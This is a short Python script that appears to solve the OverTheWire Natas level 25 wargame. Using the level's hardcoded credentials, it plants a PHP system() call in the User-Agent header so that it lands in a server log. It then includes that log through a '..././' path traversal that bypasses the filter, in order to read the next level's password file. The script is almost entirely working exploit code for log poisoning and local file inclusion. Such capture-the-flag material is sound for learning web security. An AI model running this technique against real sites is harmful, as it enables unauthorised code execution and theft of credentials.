import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas25","GHF6X7YwACaYYssHVY05cFq83hRktl4c"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()
    r = session.get(url,auth=(logar[0],logar[1]))
    print(session.cookies['PHPSESSID'])

    headers= {"User-Agent":"<?php system('cat /etc/natas_webpass/natas26') ?>"}

    r = session.post(url ,cookies={},data={"lang":"..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+ session.cookies['PHPSESSID']+".log"},headers=headers,auth=(logar[0],logar[1]),allow_redirects=0, timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)


    print("="*80)
